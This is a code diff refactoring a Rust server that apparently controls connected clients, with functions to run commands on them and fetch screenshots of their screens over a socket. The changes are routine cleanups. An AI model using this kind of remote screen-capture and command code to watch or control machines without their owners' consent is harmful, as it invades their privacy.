@@ -1,4 +1,4 @@
-use std::{io::{self, Write, ErrorKind, Read, Error}, sync::{Arc, Mutex}, fs};
+use std::{io::{self, Write, ErrorKind, Read}, sync::{Arc, Mutex}, fs};
 use rand::{thread_rng, Rng};
 
 use crate::{server::Client, ServerCodes, ClientCodes, command::parse_quotes};
@@ -315,8 +315,7 @@ pub fn command_cmd(client: &mut Client, cmd: String) {
 }
 
 pub fn command_screenshot(client: &mut Client, args: Vec<String>) {
-    let mut msg = Vec::new();
-    msg.push(ServerCodes::MGetScreen as u8);
+    let msg = vec![ServerCodes::MGetScreen as u8];
     client.request();
     let mut stream = client.stream.lock().unwrap();
     stream.write_all(&msg).unwrap();
@@ -344,27 +343,21 @@ pub fn command_screenshot(client: &mut Client, args: Vec<String>) {
     let mut data3 = [0u8; 4];
     stream.read_exact(&mut data3).unwrap();
     let image_length = u32::from_be_bytes(data3);
-    println!("Image received with length {} bytes", image_length);
     let mut data4 = vec![0u8; image_length as usize];
     let mut image_pos: u32 = 0;
 
-    loop {
-        while image_pos < image_length {
-            let read_result = stream.read(&mut data4[image_pos as usize..]);
+    while image_pos < image_length {
+        let read_result = stream.read(&mut data4[image_pos as usize..]);
 
-            if let Ok(add) = read_result {
-                image_pos += add as u32;
-            } else if let Err(err) = read_result {
-                if err.kind() == ErrorKind::WouldBlock {
-                    continue;
-                }
-
-                panic!("{}", err);
+        if let Ok(add) = read_result {
+            image_pos += add as u32;
+        } else if let Err(err) = read_result {
+            if err.kind() == ErrorKind::WouldBlock {
+                continue;
             }
-        }
 
-        // println!("Read OK: {}", data4.len());
-        break;
+            panic!("{}", err);
+        }
     }
 
     let mut path = args[0].clone();
